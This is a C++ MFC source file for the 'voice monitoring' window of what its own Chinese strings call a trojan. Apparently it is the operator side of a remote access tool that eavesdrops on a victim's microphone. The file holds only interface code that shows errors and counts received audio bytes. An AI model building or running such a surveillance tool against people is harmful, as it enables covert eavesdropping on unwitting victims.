// AudioForm.cpp : implementation file
//

#include "stdafx.h"
#include "resource.h"
#include "AudioForm.h"
#include "AudioPlugin.h"
#include "macro.h"

// AudioForm

IMPLEMENT_DYNCREATE(AudioForm, CFormView)

AudioForm::AudioForm()
	: CFormView(AudioForm::IDD)
{
	hasVoice = false;
}

AudioForm::~AudioForm()
{
}

void AudioForm::DoDataExchange(CDataExchange* pDX)
{
	CFormView::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(AudioForm, CFormView)
	ON_WM_SIZE()
	ON_WM_DESTROY()
END_MESSAGE_MAP()


// AudioForm diagnostics

#ifdef _DEBUG
void AudioForm::AssertValid() const
{
	CFormView::AssertValid();
}

#ifndef _WIN32_WCE
void AudioForm::Dump(CDumpContext& dc) const
{
	CFormView::Dump(dc);
}
#endif
#endif //_DEBUG


// AudioForm message handlers
void AudioForm::OnInitialUpdate()
{
	CFormView::OnInitialUpdate();
	GetParentFrame()->RecalcLayout();
	ResizeParentToFit();
}


void AudioForm::OnSize(UINT nType, int cx, int cy) 
{
	CFormView::OnSize(nType, cx, cy);

	if(!hasVoice)	return;

	CRect rect;
	GetClientRect(&rect);
	int W = rect.Width(), H = rect.Height();

	//重新排列各个控件的相对关系
	try
	{
		CWnd* pWnd = this->GetDlgItem(IDC_TITLE1);
		pWnd->ShowWindow(SW_NORMAL);
		pWnd->MoveWindow(100, 100, 300, 30);

		pWnd = this->GetDlgItem(IDC_TITLE2);
		pWnd->ShowWindow(SW_NORMAL);
		pWnd->MoveWindow(100, 130, 180, 30);

		pWnd = this->GetDlgItem(IDC_TIPS);
		pWnd->ShowWindow(SW_NORMAL);
		pWnd->MoveWindow(280, 130, 120, 30);

	}
	catch(...)
	{
	}

}

void AudioForm::OnDestroy()
{
	// TODO: Add your message handler code here and/or call default
	KDebug(__FUNCTION__);
	hasVoice = false;
	AudioPlugin::CloseAudio();
}

void AudioForm::OnOperationFailed(unsigned short cmd, unsigned short resp)
{
	if(cmd == CONTROL_AUDIO_CLOSE || resp == ERR_EXIST)	return;
	
	CString errMsg;
	if(resp == ERR_NOTHISMODULE)
		errMsg = "木马服务端不支持该模块，请上传相应的插件";
	else
		errMsg = "未知错误";
	
	hasVoice = false;
	MessageBox(errMsg, "声音监听", MB_OK|MB_ICONHAND);
}

void AudioForm::ProcessData(int len)
{
	static int totalN = 0;
	if(len < 0)
	{
		hasVoice = false;
		totalN = 0;
		return;
	}

	if(!hasVoice) hasVoice = true;
	
	CString	str;
 	totalN += len;
	str.Format("Receive %d KBytes", totalN / 1024);
	SetDlgItemText(IDC_TIPS, str);
}